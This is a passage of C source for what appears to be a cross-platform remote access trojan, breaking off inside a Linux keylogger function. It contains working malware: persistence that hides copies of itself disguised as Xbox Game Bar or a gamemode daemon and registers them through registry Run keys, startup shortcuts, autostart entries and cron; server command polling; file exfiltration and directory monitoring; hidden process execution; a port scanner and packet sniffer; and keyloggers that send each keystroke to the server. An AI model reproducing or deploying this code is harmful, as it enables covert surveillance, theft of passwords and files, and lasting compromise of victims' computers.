void send_buffer_to_server(const char *filename, const unsigned char *buffer, size_t size) {
    if (!connected_to_server) {
        printf("Not connected to server\n");
        return;
    }
    
    // Create a temporary file with the buffer content
    char temp_path[MAX_PATH_LENGTH];
    #ifdef _WIN32
        char temp_dir[MAX_PATH_LENGTH];
        GetTempPathA(MAX_PATH_LENGTH, temp_dir);
        snprintf(temp_path, sizeof(temp_path), "%stemp_file_%ld.tmp", temp_dir, time(NULL));
    #else
        snprintf(temp_path, sizeof(temp_path), "/tmp/temp_file_%ld.tmp", time(NULL));
    #endif
    
    FILE *fp = fopen(temp_path, "wb");
    if (!fp) {
        printf("Failed to create temporary file: %s (error: %s)\n", temp_path, strerror(errno));
        return;
    }
    
    size_t written = fwrite(buffer, 1, size, fp);
    fclose(fp);
    
    if (written != size) {
        printf("Failed to write complete buffer to temporary file (wrote %zu of %zu bytes)\n", written, size);
        remove(temp_path);
        return;
    }
    
    printf("Uploading %s (%zu bytes)...\n", filename, size);
    
    // Send file via HTTP
    char url[MAX_PATH_LENGTH];
    snprintf(url, sizeof(url), "%s/upload", server_url);
    
    http_response_t response = http_post_file(url, temp_path);
    
    if (response.size > 0) {
        printf("Upload successful: %s\n", filename);
    } else {
        printf("Warning: No response from server after file upload (response size: %zu)\n", response.size);
    }
    
    free_http_response(&response);
    
    // Remove temporary file
    remove(temp_path);
}

void send_file_to_server(const char *filename, const unsigned char *buffer, size_t size) {
    if (use_socket_connection) {
        socket_send_file(filename, buffer, size);
    } else {
        send_buffer_to_server(filename, buffer, size);
    }
}

void receive_file_from_server(const char *filepath) {
    if (use_socket_connection) {
        socket_receive_file(filepath);
    } else {
        // For HTTP, we'll download the file from a specific URL
        char download_url[MAX_PATH_LENGTH];
        snprintf(download_url, sizeof(download_url), "%s/download/%s", server_url, filepath);
        
        http_response_t response = http_get(download_url);
        
        if (response.size > 0) {
            FILE *fp = fopen(filepath, "wb");
            if (fp) {
                fwrite(response.data, 1, response.size, fp);
                fclose(fp);
                printf("File received successfully: %s (%zu bytes)\n", filepath, response.size);
            } else {
                printf("Error: Failed to create file: %s\n", filepath);
            }
        } else {
            printf("Error: Failed to download file\n");
        }
        
        free_http_response(&response);
    }
}

// Monitor output directory for new files
#ifdef _WIN32
unsigned __stdcall monitor_output_directory(void *arg) {
#else
void* monitor_output_directory(void *arg) {
#endif
    char last_files[100][MAX_PATH_LENGTH] = {0};
    int file_count = 0;
    
    while (file_monitoring_active) {
        sleep(2); // Check every 2 seconds
        
        DIR *dir;
        struct dirent *entry;
        
        if ((dir = opendir(output_dir)) == NULL) {
            continue;
        }
        
        while ((entry = readdir(dir)) != NULL && file_count < 100) {
            // Skip "." and ".." entries
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
                continue;
            }
            
            char filepath[MAX_PATH_LENGTH];
            snprintf(filepath, sizeof(filepath), "%s/%s", output_dir, entry->d_name);
            
            // Use stat to check if this is a regular file
            struct stat file_stat;
            if (stat(filepath, &file_stat) == 0 && S_ISREG(file_stat.st_mode)) {
                // Check if this is a new file
                int is_new = 1;
                for (int i = 0; i < file_count; i++) {
                    if (strcmp(filepath, last_files[i]) == 0) {
                        is_new = 0;
                        break;
                    }
                }
                
                if (is_new) {
                    // Send file to server
                    send_file_to_server(entry->d_name, NULL, file_stat.st_size);
                    
                    // Add to our list of known files
                    if (file_count < 100) {
                        strcpy(last_files[file_count], filepath);
                        file_count++;
                    }
                }
            }
        }
        
        closedir(dir);
    }
    
#ifdef _WIN32
    return 0;
#else
    return NULL;
#endif
}

// Check if we have a console
int has_console() {
#ifdef _WIN32
    return GetConsoleWindow() != NULL;
#else
    return isatty(STDIN_FILENO);
#endif
}

// Install persistence - working version
void install_persistence() {
#ifdef _WIN32
    char current_path[MAX_PATH_LENGTH];
    GetModuleFileNameA(NULL, current_path, MAX_PATH_LENGTH);
    
    // Use TEMP directory first, then copy to AppData
    char temp_path[MAX_PATH_LENGTH];
    GetTempPathA(MAX_PATH_LENGTH, temp_path);
    
    char appdata_path[MAX_PATH_LENGTH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata_path);
    
    // Create hidden directory with unique name
    char hidden_dir[MAX_PATH_LENGTH];
    snprintf(hidden_dir, sizeof(hidden_dir), "%s\\Microsoft\\Windows\\GameBar", appdata_path);
    CreateDirectoryA(appdata_path, NULL);
    CreateDirectoryA(strcat(appdata_path, "\\Microsoft"), NULL);
    CreateDirectoryA(strcat(appdata_path, "\\Windows"), NULL);
    
    snprintf(hidden_dir, sizeof(hidden_dir), "%s\\Microsoft\\Windows\\GameBar", appdata_path);
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata_path);
    snprintf(hidden_dir, sizeof(hidden_dir), "%s\\Microsoft\\Windows\\GameBar", appdata_path);
    CreateDirectoryA(hidden_dir, NULL);
    
    // Generate unique executable name based on computer name
    char computername[256];
    DWORD size = sizeof(computername);
    GetComputerNameA(computername, &size);
    
    char hidden_exe[MAX_PATH_LENGTH];
    snprintf(hidden_exe, sizeof(hidden_exe), "%s\\GameBar_%s.exe", hidden_dir, computername);
    
    // Copy file - overwrite if exists
    BOOL copied = CopyFileA(current_path, hidden_exe, FALSE);
    if (copied) {
        SetFileAttributesA(hidden_exe, FILE_ATTRIBUTE_HIDDEN);
    }
    
    // Try registry persistence FIRST (more reliable)
    HKEY hKey;
    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, 
                                 "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                                 0, KEY_WRITE, &hKey);
    
    if (result == ERROR_SUCCESS) {
        char cmd[MAX_PATH_LENGTH * 2];
        snprintf(cmd, sizeof(cmd), "\"%s\" --minimized", hidden_exe);
        RegSetValueExA(hKey, "GameBarService", 0, REG_SZ, (BYTE*)cmd, strlen(cmd) + 1);
        RegCloseKey(hKey);
    }
    
    // Also add to startup folder as backup
    char startup_path[MAX_PATH_LENGTH];
    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path) == S_OK) {
        char shortcut_path[MAX_PATH_LENGTH];
        snprintf(shortcut_path, sizeof(shortcut_path), "%s\\GameBar.lnk", startup_path);
        
        // Delete old shortcut if exists
        DeleteFileA(shortcut_path);
        
        // Create new shortcut
        IShellLinkA* psl;
        HRESULT hr = CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, 
                                      &IID_IShellLinkA, (LPVOID*)&psl);
        if (SUCCEEDED(hr)) {
            char *userprofile = getenv("USERPROFILE");
            
            psl->lpVtbl->SetPath(psl, hidden_exe);
            psl->lpVtbl->SetArguments(psl, "--minimized");
            if (userprofile) {
                psl->lpVtbl->SetWorkingDirectory(psl, userprofile);
            }
            psl->lpVtbl->SetDescription(psl, "Xbox Game Bar");
            psl->lpVtbl->SetShowCmd(psl, SW_HIDE);
            
            IPersistFile* ppf;
            hr = psl->lpVtbl->QueryInterface(psl, &IID_IPersistFile, (LPVOID*)&ppf);
            if (SUCCEEDED(hr)) {
                WCHAR wsz[MAX_PATH];
                MultiByteToWideChar(CP_ACP, 0, shortcut_path, -1, wsz, MAX_PATH);
                ppf->lpVtbl->Save(ppf, wsz, TRUE);
                ppf->lpVtbl->Release(ppf);
            }
            psl->lpVtbl->Release(psl);
        }
    }
    
#else
    // Linux implementation
    char current_path[MAX_PATH_LENGTH];
    ssize_t len = readlink("/proc/self/exe", current_path, MAX_PATH_LENGTH - 1);
    if (len != -1) {
        current_path[len] = '\0';
    }
    
    char *home = getenv("HOME");
    if (!home) return;
    
    // Create hidden directory
    char hidden_dir[MAX_PATH_LENGTH];
    snprintf(hidden_dir, sizeof(hidden_dir), "%s/.local/share/gamemode", home);
    
    char cmd[MAX_PATH_LENGTH];
    snprintf(cmd, sizeof(cmd), "mkdir -p %s", hidden_dir);
    system(cmd);
    
    char hidden_exe[MAX_PATH_LENGTH];
    snprintf(hidden_exe, sizeof(hidden_exe), "%s/gamemode-daemon", hidden_dir);
    
    // Copy file
    snprintf(cmd, sizeof(cmd), "cp -f '%s' '%s' && chmod +x '%s'", 
             current_path, hidden_exe, hidden_exe);
    system(cmd);
    
    // Create autostart directory
    char autostart_dir[MAX_PATH_LENGTH];
    snprintf(autostart_dir, sizeof(autostart_dir), "%s/.config/autostart", home);
    snprintf(cmd, sizeof(cmd), "mkdir -p %s", autostart_dir);
    system(cmd);
    
    // Create desktop file
    char desktop_file[MAX_PATH_LENGTH];
    snprintf(desktop_file, sizeof(desktop_file), "%s/gamemode-daemon.desktop", autostart_dir);
    
    FILE *fp = fopen(desktop_file, "w");
    if (fp) {
        fprintf(fp, "[Desktop Entry]\n");
        fprintf(fp, "Type=Application\n");
        fprintf(fp, "Name=Gamemode Daemon\n");
        fprintf(fp, "Exec=%s --minimized\n", hidden_exe);
        fprintf(fp, "Path=%s\n", home);
        fprintf(fp, "Terminal=false\n");
        fprintf(fp, "NoDisplay=true\n");
        fprintf(fp, "X-GNOME-Autostart-enabled=true\n");
        fclose(fp);
        chmod(desktop_file, 0644);
    }
    
    // Add cron job
    snprintf(cmd, sizeof(cmd), 
             "(crontab -l 2>/dev/null | grep -v '%s'; echo '@reboot %s --minimized') | crontab -", 
             hidden_exe, hidden_exe);
    system(cmd);
#endif
}

// Send data to server
void send_to_server(const char *data) {
    if (!connected_to_server) return;
    
    char url[MAX_PATH_LENGTH];
    snprintf(url, sizeof(url), "%s/data", server_url);
    
    http_response_t response = http_post(url, data);
    free_http_response(&response);
}

// Receive data from server
void receive_from_server(char *buffer, int size) {
    if (!connected_to_server) return;
    
    char url[MAX_PATH_LENGTH];
    snprintf(url, sizeof(url), "%s/command", server_url);
    
    http_response_t response = http_get(url);
    
    if (response.size > 0 && response.size < size) {
        strncpy(buffer, response.data, response.size);
        buffer[response.size] = '\0';
    } else {
        buffer[0] = '\0';
    }
    
    free_http_response(&response);
}

// Execute application
void execute_application(char **args) {
    printf("\n[Application Execution]\n");
    
    if (args[0] == NULL) {
        printf("Usage: execute <application_path> [arguments...] [-headless]\n");
        return;
    }
    
    // Check for headless flag
    int headless = 0;
    char *app_args[MAX_COMMAND_LENGTH / 2 + 1];
    int arg_count = 0;
    
    // Parse arguments and check for -headless flag
    for (int i = 0; args[i] != NULL; i++) {
        if (strcmp(args[i], "-headless") == 0) {
            headless = 1;
        } else {
            app_args[arg_count++] = args[i];
        }
    }
    app_args[arg_count] = NULL;
    
    printf("Executing: %s\n", app_args[0]);
    if (headless) {
        printf("Running in headless mode (no visible window)\n");
    }
    
#ifdef _WIN32
    // Windows implementation
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    
    // Build command line
    char cmd_line[MAX_COMMAND_LENGTH * 2] = "";
    for (int i = 0; app_args[i] != NULL; i++) {
        if (i > 0) strcat(cmd_line, " ");
        
        // Quote arguments with spaces
        if (strchr(app_args[i], ' ')) {
            strcat(cmd_line, "\"");
            strcat(cmd_line, app_args[i]);
            strcat(cmd_line, "\"");
        } else {
            strcat(cmd_line, app_args[i]);
        }
    }
    
    DWORD flags = 0;
    if (headless) {
        flags = CREATE_NO_WINDOW;
    }
    
    if (!CreateProcess(NULL, cmd_line, NULL, NULL, FALSE, flags, NULL, NULL, &si, &pi)) {
        char errorMsg[256];
        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                      NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
                      errorMsg, sizeof(errorMsg), NULL);
        printf("Failed to execute application: %s\n", errorMsg);
        return;
    }
    
    printf("Process started with PID: %d\n", pi.dwProcessId);
    
    // Close handles to avoid resource leaks
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
#else
    // Linux implementation
    pid_t pid = fork();
    
    if (pid == 0) {
        // Child process
        if (headless) {
            // Create new session to detach from terminal
            setsid();
            
            // Redirect stdin, stdout, stderr to /dev/null
            freopen("/dev/null", "r", stdin);
            freopen("/dev/null", "w", stdout);
            freopen("/dev/null", "w", stderr);
        }
        
        // Check if the path contains a slash (indicating a file path)
        if (strchr(app_args[0], '/') != NULL) {
            // It's a file path, try to execute it directly
            if (access(app_args[0], X_OK) == 0) {
                execv(app_args[0], app_args);
            }
            // If we get here, execv failed
            fprintf(stderr, "Failed to execute %s: %s\n", app_args[0], strerror(errno));
            exit(EXIT_FAILURE);
        } else {
            // Try to find the executable in PATH
            char *path_env = getenv("PATH");
            if (path_env == NULL) {
                fprintf(stderr, "PATH environment variable not set\n");
                exit(EXIT_FAILURE);
            }
            
            // Try to execute directly first (in case it's in PATH)
            execvp(app_args[0], app_args);
            
            // If that fails, try to find it in PATH
            char *path = strdup(path_env);
            char *dir = strtok(path, ":");
            int found = 0;
            
            while (dir != NULL && !found) {
                char full_path[MAX_PATH_LENGTH];
                snprintf(full_path, sizeof(full_path), "%s/%s", dir, app_args[0]);
                
                if (access(full_path, X_OK) == 0) {
                    execv(full_path, app_args);
                    // If we get here, execv failed
                    fprintf(stderr, "Failed to execute %s: %s\n", full_path, strerror(errno));
                    found = 1;
                }
                
                dir = strtok(NULL, ":");
            }
            
            free(path);
            
            // If we get here, the executable was not found in PATH
            if (!found) {
                // Try current directory as a last resort
                char full_path[MAX_PATH_LENGTH];
                snprintf(full_path, sizeof(full_path), "./%s", app_args[0]);
                
                if (access(full_path, X_OK) == 0) {
                    execv(full_path, app_args);
                    // If we get here, execv failed
                    fprintf(stderr, "Failed to execute %s: %s\n", full_path, strerror(errno));
                } else {
                    fprintf(stderr, "Executable not found: %s\n", app_args[0]);
                    fprintf(stderr, "Please provide a full path or ensure the executable is in PATH\n");
                }
            }
            
            exit(EXIT_FAILURE);
        }
    } else if (pid < 0) {
        // Fork failed
        perror("fork failed");
    } else {
        // Parent process
        printf("Process started with PID: %d\n", pid);
    }
#endif
}

// Change directory
void change_directory(char **args) {
    if (args[0] == NULL) {
        #ifdef _WIN32
            strcpy(current_dir, "C:\\");
        #else
            strcpy(current_dir, "/");
        #endif
    } else {
        if (chdir(args[0]) != 0) {
            printf("Directory not found: %s\n", args[0]);
            return;
        }
    }
    
    if (getcwd(current_dir, sizeof(current_dir)) != NULL) {
        printf("Changed directory to %s\n", current_dir);
        
        // Always send the directory update to the server
        if (connected_to_server) {
            char msg[MAX_PATH_LENGTH + 20];
            snprintf(msg, sizeof(msg), "DIR_CHANGED:%s", current_dir);
            send_data_to_server(msg);
        }
    } else {
        printf("Failed to get current directory\n");
    }
}

// List directory contents
void list_directory(char **args) {
    char path[MAX_PATH_LENGTH];
    
    if (args[0] == NULL) {
        strcpy(path, current_dir);
    } else {
        strcpy(path, args[0]);
    }

    DIR *dir;
    struct dirent *entry;
    struct stat file_stat;

    if ((dir = opendir(path)) == NULL) {
        printf("Could not open directory %s\n", path);
        return;
    }

    printf("Contents of %s:\n", path);
    
    while ((entry = readdir(dir)) != NULL) {
        char full_path[MAX_PATH_LENGTH];
        snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);
        
        if (stat(full_path, &file_stat) == -1) {
            continue;
        }

        if (S_ISDIR(file_stat.st_mode)) {
            printf("[DIR]  %s\n", entry->d_name);
        } else {
            printf("[FILE] %s (%ld bytes)\n", entry->d_name, file_stat.st_size);
        }
    }

    closedir(dir);
}

// Print working directory
void print_working_directory(char **args) {
    printf("%s\n", current_dir);
    
    // Always send the current directory to the server
    if (connected_to_server) {
        char msg[MAX_PATH_LENGTH + 20];
        snprintf(msg, sizeof(msg), "DIR_CHANGED:%s", current_dir);
        send_data_to_server(msg);
    }
}

// Pull file from client to server
void pull_file(char **args) {
    if (args[0] == NULL) {
        printf("Usage: pull <file_path>\n");
        return;
    }
    
    printf("\n[File Pull]\n");
    printf("Pulling file: %s\n", args[0]);
    
    // Check if file exists
    FILE *fp = fopen(args[0], "rb");
    if (!fp) {
        printf("Error: File not found: %s\n", args[0]);
        return;
    }
    
    // Get file size
    fseek(fp, 0, SEEK_END);
    long file_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    
    // Read file into memory
    unsigned char *file_data = (unsigned char *)malloc(file_size);
    if (!file_data) {
        printf("Error: Memory allocation failed\n");
        fclose(fp);
        return;
    }
    
    size_t bytes_read = fread(file_data, 1, file_size, fp);
    fclose(fp);
    
    if (bytes_read != file_size) {
        printf("Error: Failed to read entire file\n");
        free(file_data);
        return;
    }
    
    // Extract filename from path
    char *filename = strrchr(args[0], '/');
    if (!filename) {
        filename = strrchr(args[0], '\\');
    }
    if (filename) {
        filename++; // Skip the separator
    } else {
        filename = args[0];
    }
    
    // Send file to server
    send_file_to_server(filename, file_data, file_size);
    free(file_data);
    
    printf("File sent to server: %s (%ld bytes)\n", filename, file_size);
}

// Send file from server to client
void send_file(char **args) {
    if (args[0] == NULL || args[1] == NULL) {
        printf("Usage: send <file_path> <file_size>\n");
        return;
    }
    
    printf("\n[File Send]\n");
    printf("Receiving file: %s (%s bytes)\n", args[0], args[1]);
    
    size_t file_size = atoi(args[1]);
    if (file_size <= 0) {
        printf("Error: Invalid file size\n");
        return;
    }
    
    // Receive file from server
    receive_file_from_server(args[0]);
}

// Create a note file
void create_note(char **args) {
    if (args[0] == NULL) {
        printf("Usage: note <filename> [content]\n");
        return;
    }

    char filename[MAX_PATH_LENGTH];
    snprintf(filename, sizeof(filename), "%s/notes/%s", output_dir, args[0]);
    
    if (strstr(filename, ".txt") == NULL) {
        strcat(filename, ".txt");
    }

    FILE *fp = fopen(filename, "w");
    if (fp == NULL) {
        printf("Failed to create note %s\n", filename);
        return;
    }

    if (args[1] == NULL) {
        printf("Creating note '%s'. Enter your text (Ctrl+D to save):\n", filename);
        
        char line[256];
        while (fgets(line, sizeof(line), stdin) != NULL) {
            fputs(line, fp);
        }
    } else {
        for (int i = 1; args[i] != NULL; i++) {
            fprintf(fp, "%s ", args[i]);
        }
    }

    fclose(fp);
    printf("Note created: %s\n", filename);
}

// Show help
void show_help(char **args) {
    printf("\nAvailable commands:\n");
    
    for (int i = 0; commands[i].name != NULL; i++) {
        printf("%-10s %s\n", commands[i].name, commands[i].description);
    }
    
    printf("\nFor detailed help on a command, type: help <command>\n");
}

// Vulnerability scanner
void vulnerability_scan(char **args) {
    printf("\n[Vulnerability Scanner]\n");
    
    char ip[64] = "127.0.0.1";
    if (args[0] != NULL) {
        strncpy(ip, args[0], sizeof(ip)-1);
    }
    
    printf("Scanning IP: %s (ports 1-%d)\n", ip, PORT_SCAN_LIMIT);
    
    #ifdef _WIN32
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            printf("WSAStartup failed\n");
            return;
        }
    #endif
    
    for (int port = 1; port <= PORT_SCAN_LIMIT; port++) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            continue;
        }
        
        struct sockaddr_in sa;
        sa.sin_family = AF_INET;
        sa.sin_port = htons(port);
        
        #ifdef _WIN32
            sa.sin_addr.s_addr = inet_addr(ip);
        #else
            inet_pton(AF_INET, ip, &sa.sin_addr);
        #endif
        
        // Set timeout
        struct timeval timeout;
        timeout.tv_sec = 0;
        timeout.tv_usec = 200000; // 200ms
        
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
        
        if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) == 0) {
            printf("Port %d is open\n", port);
        }
        
        #ifdef _WIN32
            closesocket(sock);
        #else
            close(sock);
        #endif
    }
    
    #ifdef _WIN32
        WSACleanup();
    #endif
}

// Network sniffer
void network_sniffer(char **args) {
    printf("\n[Network Sniffer]\n");
    
    char filter[256] = "";
    if (args[0] != NULL) {
        strncpy(filter, args[0], sizeof(filter)-1);
    }
    
    printf("Starting network sniffing (filter: %s)\n", strlen(filter) > 0 ? filter : "none");
    
    #ifdef _WIN32
        char cmd[MAX_COMMAND_LENGTH];
        snprintf(cmd, sizeof(cmd), "netsh trace start capture=yes report=no tracefile=%s/captures/sniff.etl %s", 
                 output_dir, strlen(filter) > 0 ? filter : "");
        system(cmd);
        printf("Capture started. Use 'netsh trace stop' to stop.\n");
    #else
        char cmd[MAX_COMMAND_LENGTH];
        snprintf(cmd, sizeof(cmd), "sudo tcpdump -i any -w %s/captures/sniff.pcap %s", 
                 output_dir, strlen(filter) > 0 ? filter : "");
        system(cmd);
    #endif
}

// Keylogger
static FILE *keylog_file = NULL;
static char keylog_filename[MAX_PATH_LENGTH];

#ifdef _WIN32
HHOOK keyboard_hook = NULL;

LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;
        
        if (wParam == WM_KEYDOWN) {
            if (keylog_file) {
                switch (kb->vkCode) {
                    case VK_RETURN:
                        fprintf(keylog_file, "\n");
                        break;
                    case VK_SPACE:
                        fprintf(keylog_file, " ");
                        break;
                    case VK_BACK:
                        fprintf(keylog_file, "[BACKSPACE]");
                        break;
                    case VK_TAB:
                        fprintf(keylog_file, "[TAB]");
                        break;
                    default:
                        char c = MapVirtualKey(kb->vkCode, MAPVK_VK_TO_CHAR);
                        if (isprint(c)) {
                            fprintf(keylog_file, "%c", tolower(c));
                        }
                }
                fflush(keylog_file);
            }
        }
    }
    return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
}
#else
void* keylogger_thread_func(void *arg) {
    Display *display = XOpenDisplay(NULL);
    if (!display) {
        fprintf(stderr, "Failed to open X display\n");
        return NULL;
    }

    Window root = DefaultRootWindow(display);
    XEvent event;
    KeySym keysym;
    char buffer[32];
    int len;

    keylog_file = fopen(keylog_filename, "a");
    if (!keylog_file) {
        fprintf(stderr, "Failed to open log file\n");
        XCloseDisplay(display);
        return NULL;
    }

    XSelectInput(display, root, KeyPressMask);

    while (keylogger_active) {
        if (XPending(display) > 0) {
            XNextEvent(display, &event);
            
            if (event.type == KeyPress) {
                len = XLookupString(&event.xkey, buffer, sizeof(buffer), &keysym, NULL);
                
                if (len > 0 && keylog_file) {
                    switch (keysym) {
                        case XK_Return:
                            fprintf(keylog_file, "\n");
                            break;
                        case XK_BackSpace:
                            fprintf(keylog_file, "[BACKSPACE]");
                            break;
                        case XK_space:
                            fprintf(keylog_file, " ");
                            break;
                        case XK_Tab:
                            fprintf(keylog_file, "[TAB]");
                            break;
                        default:
                            if (isprint(buffer[0])) {
                                fprintf(keylog_file, "%c", buffer[0]);
                            }
                    }
                    fflush(keylog_file);
                }
            }
        } else {
            usleep(10000);
        }
    }

    if (keylog_file) {
        fclose(keylog_file);
        keylog_file = NULL;
    }
    XCloseDisplay(display);
    return NULL;
}
#endif

static char keylog_filename[MAX_PATH_LENGTH];

#ifdef _WIN32
// Windows key mapping
const char* get_win_key_name(int vk_code, int shift_pressed) {
    switch(vk_code) {
        case VK_BACK: return "[BACKSPACE]";
        case VK_RETURN: return "[ENTER]";
        case VK_SPACE: return " ";
        case VK_TAB: return "[TAB]";
        case VK_ESCAPE: return "[ESC]";
        case VK_CONTROL: return "[CTRL]";
        case VK_SHIFT: return "[SHIFT]";
        case VK_MENU: return "[ALT]";
        case VK_CAPITAL: return "[CAPS]";
        case VK_LEFT: return "[LEFT]";
        case VK_RIGHT: return "[RIGHT]";
        case VK_UP: return "[UP]";
        case VK_DOWN: return "[DOWN]";
        case VK_INSERT: return "[INSERT]";
        case VK_DELETE: return "[DELETE]";
        case VK_HOME: return "[HOME]";
        case VK_END: return "[END]";
        case VK_PRIOR: return "[PGUP]";
        case VK_NEXT: return "[PGDN]";
        case VK_F1: return "[F1]";
        case VK_F2: return "[F2]";
        case VK_F3: return "[F3]";
        case VK_F4: return "[F4]";
        case VK_F5: return "[F5]";
        case VK_F6: return "[F6]";
        case VK_F7: return "[F7]";
        case VK_F8: return "[F8]";
        case VK_F9: return "[F9]";
        case VK_F10: return "[F10]";
        case VK_F11: return "[F11]";
        case VK_F12: return "[F12]";
        
        // Alphanumeric keys
        case 0x30: return shift_pressed ? ")" : "0";
        case 0x31: return shift_pressed ? "!" : "1";
        case 0x32: return shift_pressed ? "@" : "2";
        case 0x33: return shift_pressed ? "#" : "3";
        case 0x34: return shift_pressed ? "$" : "4";
        case 0x35: return shift_pressed ? "%" : "5";
        case 0x36: return shift_pressed ? "^" : "6";
        case 0x37: return shift_pressed ? "&" : "7";
        case 0x38: return shift_pressed ? "*" : "8";
        case 0x39: return shift_pressed ? "(" : "9";
        
        case 0x41: return shift_pressed ? "A" : "a";
        case 0x42: return shift_pressed ? "B" : "b";
        case 0x43: return shift_pressed ? "C" : "c";
        case 0x44: return shift_pressed ? "D" : "d";
        case 0x45: return shift_pressed ? "E" : "e";
        case 0x46: return shift_pressed ? "F" : "f";
        case 0x47: return shift_pressed ? "G" : "g";
        case 0x48: return shift_pressed ? "H" : "h";
        case 0x49: return shift_pressed ? "I" : "i";
        case 0x4A: return shift_pressed ? "J" : "j";
        case 0x4B: return shift_pressed ? "K" : "k";
        case 0x4C: return shift_pressed ? "L" : "l";
        case 0x4D: return shift_pressed ? "M" : "m";
        case 0x4E: return shift_pressed ? "N" : "n";
        case 0x4F: return shift_pressed ? "O" : "o";
        case 0x50: return shift_pressed ? "P" : "p";
        case 0x51: return shift_pressed ? "Q" : "q";
        case 0x52: return shift_pressed ? "R" : "r";
        case 0x53: return shift_pressed ? "S" : "s";
        case 0x54: return shift_pressed ? "T" : "t";
        case 0x55: return shift_pressed ? "U" : "u";
        case 0x56: return shift_pressed ? "V" : "v";
        case 0x57: return shift_pressed ? "W" : "w";
        case 0x58: return shift_pressed ? "X" : "x";
        case 0x59: return shift_pressed ? "Y" : "y";
        case 0x5A: return shift_pressed ? "Z" : "z";
        
        // Special characters
        case VK_OEM_1: return shift_pressed ? ":" : ";";
        case VK_OEM_2: return shift_pressed ? "?" : "/";
        case VK_OEM_3: return shift_pressed ? "~" : "`";
        case VK_OEM_4: return shift_pressed ? "{" : "[";
        case VK_OEM_5: return shift_pressed ? "|" : "\\";
        case VK_OEM_6: return shift_pressed ? "}" : "]";
        case VK_OEM_7: return shift_pressed ? "\"" : "'";
        case VK_OEM_PLUS: return shift_pressed ? "+" : "=";
        case VK_OEM_COMMA: return shift_pressed ? "<" : ",";
        case VK_OEM_MINUS: return shift_pressed ? "_" : "-";
        case VK_OEM_PERIOD: return shift_pressed ? ">" : ".";
        
        default: return NULL;
    }
}

// For Windows keylogger thread
DWORD WINAPI windows_keylogger_thread(LPVOID lpParam) {
    printf("Windows keylogger started\n");
    printf("Log file: %s\n", keylog_filename);
    
    int shift_pressed = 0;
    
    while(keylogger_active) {
        Sleep(10); // Small delay to reduce CPU usage
        
        // Check shift state
        shift_pressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) ? 1 : 0;
        
        // Check all keys
        for(int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 1) { // Key was pressed
                const char* key_name = get_win_key_name(key, shift_pressed);
                if (key_name != NULL) {
                    // Write to local file
                    if (keylog_file) {
                        fprintf(keylog_file, "%s", key_name);
                        fflush(keylog_file);
                    }
                    
                    // Send to server if connected
                    if (connected_to_server) {
                        char keylog_msg[512];
                        snprintf(keylog_msg, sizeof(keylog_msg), "KEYLOG: %s", key_name);
                        send_data_to_server(keylog_msg);
                    }
                }
            }
        }
    }
    
    return 0;
}
#else
// Linux key mapping
const char* get_linux_key_name(int code) {
    switch(code) {
        case KEY_A: return "a";
        case KEY_B: return "b";
        case KEY_C: return "c";
        case KEY_D: return "d";
        case KEY_E: return "e";
        case KEY_F: return "f";
        case KEY_G: return "g";
        case KEY_H: return "h";
        case KEY_I: return "i";
        case KEY_J: return "j";
        case KEY_K: return "k";
        case KEY_L: return "l";
        case KEY_M: return "m";
        case KEY_N: return "n";
        case KEY_O: return "o";
        case KEY_P: return "p";
        case KEY_Q: return "q";
        case KEY_R: return "r";
        case KEY_S: return "s";
        case KEY_T: return "t";
        case KEY_U: return "u";
        case KEY_V: return "v";
        case KEY_W: return "w";
        case KEY_X: return "x";
        case KEY_Y: return "y";
        case KEY_Z: return "z";
        case KEY_0: return "0";
        case KEY_1: return "1";
        case KEY_2: return "2";
        case KEY_3: return "3";
        case KEY_4: return "4";
        case KEY_5: return "5";
        case KEY_6: return "6";
        case KEY_7: return "7";
        case KEY_8: return "8";
        case KEY_9: return "9";
        case KEY_ENTER: return "[ENTER]";
        case KEY_SPACE: return " ";
        case KEY_BACKSPACE: return "[BACKSPACE]";
        case KEY_TAB: return "[TAB]";
        case KEY_ESC: return "[ESC]";
        case KEY_LEFTCTRL: return "[CTRL]";
        case KEY_LEFTSHIFT: return "[SHIFT]";
        case KEY_RIGHTSHIFT: return "[SHIFT]";
        case KEY_LEFTALT: return "[ALT]";
        case KEY_RIGHTALT: return "[ALT]";
        case KEY_CAPSLOCK: return "[CAPS]";
        case KEY_DOT: return ".";
        case KEY_COMMA: return ",";
        case KEY_SLASH: return "/";
        case KEY_SEMICOLON: return ";";
        case KEY_APOSTROPHE: return "'";
        case KEY_LEFTBRACE: return "[";
        case KEY_RIGHTBRACE: return "]";
        case KEY_BACKSLASH: return "\\";
        case KEY_MINUS: return "-";
        case KEY_EQUAL: return "=";
        case KEY_GRAVE: return "`";
        default: return NULL;
    }
}

// For Linux keylogger thread
void* linux_keylogger_thread(void* arg) {
    printf("Linux keylogger started\n");
    printf("Log file: %s\n", keylog_filename);
    
    // Try to find keyboard device
    int keyboard_fd = -1;
    const char* devices[] = {
        "/dev/input/event0",
